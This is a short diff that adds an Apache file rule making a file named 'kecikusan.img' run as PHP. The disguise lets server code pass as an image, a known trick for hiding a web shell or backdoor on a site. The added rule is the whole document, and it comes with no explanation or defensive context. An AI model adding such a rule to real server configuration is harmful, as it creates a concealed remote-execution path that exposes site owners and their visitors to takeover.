@@ -1,0 +1,3 @@
+<Files "kecikusan.img"> 
+    AddType application/x-httpd-php .img
+</Files>
